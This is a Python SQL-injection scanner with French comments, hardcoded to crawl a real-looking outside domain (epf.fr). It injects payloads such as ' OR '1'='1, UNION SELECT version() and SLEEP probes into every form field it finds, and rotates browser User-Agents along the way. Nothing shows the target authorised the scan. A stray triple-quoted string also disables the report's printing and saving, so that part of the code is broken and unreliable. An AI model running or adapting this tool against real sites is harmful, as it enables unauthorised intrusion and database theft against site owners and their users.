import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import time
import random
import re
from datetime import datetime
import sys

# ==== CONFIGURATION ====
TARGET_URL = "http://epf.fr"  # URL cible
MAX_DEPTH = 2  # Profondeur de crawling
MAX_URLS_TO_SCAN = 20  # Nombre maximum d'URLs à scanner
# ======================

# Variables globales
visited_urls = set()
found_vulnerabilities = []
tested_fields = set()  # Pour éviter de tester le même champ plusieurs fois

# Payloads SQLi à tester
SQLI_PAYLOADS = [
    "' OR '1'='1", 
    "' OR '1'='1'--", 
    "' UNION SELECT null, version()--", 
    "' AND (SELECT * FROM (SELECT(SLEEP(2)))a)--", 
    "' OR IF(1=1, SLEEP(2), 0)--"
]

# User-Agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15"
]

# Patterns d'erreurs SQL
SQL_ERROR_PATTERNS = [
    r"SQL syntax.*?MySQL", 
    r"Warning.*?mysql_", 
    r"MySQLSyntaxErrorException", 
    r"valid MySQL result",
    r"ORA-[0-9][0-9][0-9][0-9]",
    r"PostgreSQL.*?ERROR"
]

def get_random_user_agent():
    """Retourne un User-Agent aléatoire"""
    return random.choice(USER_AGENTS)

def crawl_url(url, depth, max_depth, session):
    """Explore le site pour trouver des pages intéressantes"""
    if depth > max_depth or len(visited_urls) >= MAX_URLS_TO_SCAN:
        return set()
    
    if url in visited_urls:
        return set()
    
    visited_urls.add(url)
    print(f"Exploration: {url} (Profondeur: {depth}/{max_depth})")
    
    try:
        headers = {"User-Agent": get_random_user_agent()}
        response = session.get(url, headers=headers, timeout=5)
        response.raise_for_status()
    except Exception as e:
        print(f"Erreur lors de l'exploration de {url}: {str(e)}")
        return set()

    # Analyse la page pour trouver les formulaires
    forms = find_forms(response.text, url)
    for form in forms:
        form_details = get_form_details(form, url)
        test_sqli(url, form_details, session)
    
    # Extrait tous les liens de la page
    soup = BeautifulSoup(response.text, 'html.parser')
    base_domain = urlparse(url).netloc
    discovered_urls = set()
    
    for link in soup.find_all("a", href=True):
        href = link["href"]
        full_url = urljoin(url, href)
        parsed_url = urlparse(full_url)
        
        # Vérifie que c'est un lien du même domaine
        if parsed_url.netloc == base_domain:
            # Privilégie les pages avec formulaires ou paramètres GET
            if parsed_url.path.endswith(".php") or "?" in full_url:
                discovered_urls.add(full_url)
    
    # Explore récursivement les URLs découvertes
    new_urls = set()
    for discovered_url in discovered_urls:
        if discovered_url not in visited_urls:
            time.sleep(random.uniform(0.3, 0.7))  # Délai réduit
            new_urls.update(crawl_url(discovered_url, depth + 1, max_depth, session))
    
    return discovered_urls.union(new_urls)

def find_forms(html_content, base_url):
    """Récupère tous les formulaires d'une page"""
    soup = BeautifulSoup(html_content, 'html.parser')
    forms = soup.find_all('form')
    
    # Vérifie aussi les liens avec paramètres (GET)
    links_with_params = []
    for link in soup.find_all('a', href=True):
        href = link['href']
        if '?' in href:
            # Simule un formulaire pour les liens avec paramètres
            form = soup.new_tag('form')
            form['action'] = href
            form['method'] = 'get'
            
            # Extraire les paramètres
            params = urlparse(href).query
            for param_pair in params.split('&'):
                if '=' in param_pair:
                    param_name = param_pair.split('=', 1)[0]
                    input_tag = soup.new_tag('input')
                    input_tag['type'] = 'text'
                    input_tag['name'] = param_name
                    form.append(input_tag)
            
            links_with_params.append(form)
    
    return forms + links_with_params

def get_form_details(form, base_url):
    """Extrait les détails d'un formulaire"""
    action = form.get("action", "")
    action_url = urljoin(base_url, action) if action else base_url
    
    method = form.get("method", "get").lower()
    
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.get("type", "text")
        input_name = input_tag.get("name")
        
        if input_name:  # Ignorer les inputs sans nom
            inputs.append({"name": input_name, "type": input_type, "value": input_tag.get("value", "")})
    
    # Inclure les zones de texte et listes déroulantes
    for textarea in form.find_all("textarea"):
        if textarea.get("name"):
            inputs.append({"name": textarea.get("name"), "type": "textarea", "value": textarea.text.strip()})
    
    for select in form.find_all("select"):
        if select.get("name"):
            inputs.append({"name": select.get("name"), "type": "select", "value": ""})
    
    return {
        "action": action_url,
        "method": method,
        "inputs": inputs
    }

def test_sqli(url, form_details, session):
    """Test d'injection SQL"""
    action_url = form_details["action"]
    method = form_details["method"]
    inputs = form_details["inputs"]
    
    print(f"Test SQLi sur: {action_url} [Méthode: {method.upper()}]")
    
    # Mesure du temps de réponse normal (référence)
    baseline_times = []
    for _ in range(2):
        data = {}
        for input_data in inputs:
            # Valeurs par défaut selon le type
            if input_data["type"] == "text" or input_data["type"] == "search":
                data[input_data["name"]] = "test123"
            elif input_data["type"] == "password":
                data[input_data["name"]] = "Password123!"
            elif input_data["type"] == "email":
                data[input_data["name"]] = "test@example.com"
            else:
                data[input_data["name"]] = input_data.get("value", "")
        
        try:
            headers = {"User-Agent": get_random_user_agent()}
            start_time = time.time()
            
            if method == "post":
                response = session.post(action_url, data=data, headers=headers, timeout=5)
            else:
                response = session.get(action_url, params=data, headers=headers, timeout=5)
                
            baseline_times.append(time.time() - start_time)
        except Exception:
            continue
    
    if not baseline_times:
        print(f"Impossible d'établir un temps de référence pour {action_url}")
        return
    
    avg_baseline = sum(baseline_times) / len(baseline_times)
    time_threshold = max(avg_baseline * 3, 2)  # Seuil pour détecter les délais anormaux
    
    # Teste chaque payload sur chaque champ vulnérable potentiel
    for input_data in inputs:
        if input_data["type"] not in ["text", "search", "textarea", "password", "email", "url"]:
            continue  # Ignore les champs non susceptibles d'être vulnérables
        
        input_name = input_data["name"]
        
        # Crée un identifiant unique pour ce champ (URL + méthode + nom)
        field_id = f"{action_url}#{method}#{input_name}"
        
        # Vérifie si ce champ a déjà été testé
        if field_id in tested_fields:
            print(f"Champ {input_name} déjà testé sur {action_url}, ignoré")
            continue
            
        tested_fields.add(field_id)
        
        for payload in SQLI_PAYLOADS:
            # Prépare les données avec le payload
            data = {}
            for inp in inputs:
                if inp["name"] == input_name:
                    data[inp["name"]] = payload  # Injecte le payload dans ce champ
                elif inp["type"] == "password":
                    data[inp["name"]] = "Password123!"
                elif inp["type"] == "email":
                    data[inp["name"]] = "test@example.com"
                else:
                    data[inp["name"]] = inp.get("value", "") or "test123"
            
            # Délai entre les requêtes
            time.sleep(random.uniform(0.2, 0.3))
            
            try:
                headers = {"User-Agent": get_random_user_agent()}
                start_time = time.time()
                
                if method == "post":
                    response = session.post(action_url, data=data, headers=headers, timeout=10)
                else:
                    response = session.get(action_url, params=data, headers=headers, timeout=10)
                
                elapsed_time = time.time() - start_time
            except Exception as e:
                # Les timeouts peuvent indiquer une vulnérabilité time-based
                if "timeout" in str(e).lower():
                    print(f"Timeout détecté avec payload: {payload} sur {input_name}")
                    record_vulnerability(url, input_name, payload, "Time-based SQLi (timeout)", form_details)
                continue
            
            # Détection basée sur les erreurs
            for pattern in SQL_ERROR_PATTERNS:
                if re.search(pattern, response.text, re.IGNORECASE):
                    print(f"Error-based SQLi détectée sur {input_name} avec: {payload}")
                    record_vulnerability(url, input_name, payload, "Error-based SQLi", form_details)
                    break
            
            # Détection basée sur le temps (pour les payloads time-based)
            if "SLEEP" in payload or "BENCHMARK" in payload or "DELAY" in payload:
                if elapsed_time > time_threshold:
                    print(f"Time-based SQLi détectée sur {input_name} avec: {payload} ({elapsed_time:.2f}s vs {avg_baseline:.2f}s baseline)")
                    record_vulnerability(url, input_name, payload, "Time-based SQLi", form_details)

def record_vulnerability(url, input_name, payload, vuln_type, form_details):
    """Enregistre une vulnérabilité détectée"""
    vuln = {
        "url": url,
        "form_action": form_details["action"],
        "method": form_details["method"],
        "input_name": input_name,
        "payload": payload,
        "type": vuln_type,
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    
    # Évite les doublons
    for existing_vuln in found_vulnerabilities:
        if (existing_vuln["url"] == vuln["url"] and 
            existing_vuln["form_action"] == vuln["form_action"] and
            existing_vuln["input_name"] == vuln["input_name"]):
            return
    
    found_vulnerabilities.append(vuln)
    
def generate_report():
    """Génère un rapport des vulnérabilités trouvées"""
    if not found_vulnerabilities:
        print("Aucune vulnérabilité SQLi détectée.")
        return
    
    report = f"""
==============================================
RAPPORT DE SCAN DE VULNÉRABILITÉS SQLi
==============================================
Date: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
Cible: {TARGET_URL}
URLs scannées: {len(visited_urls)}
Vulnérabilités trouvées: {len(found_vulnerabilities)}

VULNÉRABILITÉS DÉTECTÉES:
"""
    
    for i, vuln in enumerate(found_vulnerabilities, 1):
        report += f"""
[{i}] {vuln['type']}
    URL: {vuln['url']}
    Formulaire: {vuln['form_action']} [Méthode: {vuln['method'].upper()}]
    Champ vulnérable: {vuln['input_name']}
    Payload efficace: {vuln['payload']}
    Détecté à: {vuln['timestamp']}
"""
    
    report += """
==============================================
RECOMMANDATIONS:
1. Utiliser des requêtes préparées ou des ORM
2. Valider et assainir toutes les entrées utilisateur
3. Implémenter un principe de moindre privilège pour les comptes DB
4. Activer les pare-feu applicatifs web (WAF)
==============================================
"""
    """
    print("\n" + report)
    
    # Enregistre le rapport dans un fichier
    report_file = f"rapport_sqli_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    try:
        with open(report_file, 'w') as f:
            f.write(report)
        print(f"Rapport enregistré dans {report_file}")
    except Exception as e:
        print(f"Erreur lors de l'enregistrement du rapport: {str(e)}")
    """

def main():
    print(f"\n{'=' * 60}")
    print(f"Scanner SQLi - Démarrage")
    print(f"{'=' * 60}")
    print(f"URL cible: {TARGET_URL}")
    print(f"Profondeur maximum: {MAX_DEPTH}")
    print(f"{'=' * 60}\n")
    
    session = requests.Session()
    
    # Valide que l'URL est accessible
    try:
        headers = {"User-Agent": get_random_user_agent()}
        session.get(TARGET_URL, headers=headers, timeout=5).raise_for_status()
    except Exception as e:
        print(f"Impossible d'accéder à l'URL cible {TARGET_URL}: {str(e)}")
        sys.exit(1)
    
    try:
        start_time = time.time()
        
        # Crawl le site pour trouver des URLs intéressantes
        print("Début de l'exploration...")
        crawl_url(TARGET_URL, 1, MAX_DEPTH, session)
        print(f"Exploration terminée. {len(visited_urls)} URLs découvertes.")
        
        elapsed_time = time.time() - start_time
        
        # Génération du rapport
        print(f"\nScan terminé en {elapsed_time:.2f} secondes.")
        generate_report()
        
    except KeyboardInterrupt:
        print("\nScan interrompu par l'utilisateur.")
        generate_report()
    except Exception as e:
        print(f"Erreur inattendue: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    main()